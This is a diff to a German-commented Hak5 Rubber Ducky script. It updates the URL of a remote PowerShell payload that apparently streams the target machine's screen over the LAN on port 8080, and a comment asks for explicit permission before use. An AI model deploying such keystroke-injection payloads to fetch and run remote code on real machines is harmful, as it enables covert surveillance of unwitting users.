@@ -9,9 +9,9 @@ REM        http://<LAN-IP des Ziels>:8080/
 REM
 REM  Payload: eigene, gepatchte Kopie des offiziellen Hak5-payloads
 REM  (view-only, KEINE Maus-/Tastatureingabe)
-REM  https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.4/s.ps1
+REM  https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.5/s.ps1
 REM  (s.ps1 = identische Kurz-Datei von Screenshare-Over-LAN-fixed.ps1;
-REM   der Tag v1.4 ist immutable - bei einer neuen Version einen neuen Tag
+REM   der Tag v1.5 ist immutable - bei einer neuen Version einen neuen Tag
 REM   vergeben und die URL hier anpassen)
 REM
 REM  Voraussetzungen am Ziel:
@@ -25,7 +25,7 @@ REM  ausdrueckliche Erlaubnis hast.
 REM ============================================================================
 
 REM ----------------------------- Konfiguration -------------------------------
-DEFINE #SCRIPTURL https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.4/s.ps1
+DEFINE #SCRIPTURL https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.5/s.ps1
 DEFINE #PORT 8080
 
 REM -------------------------- Windows-Erkennung -----------------------------
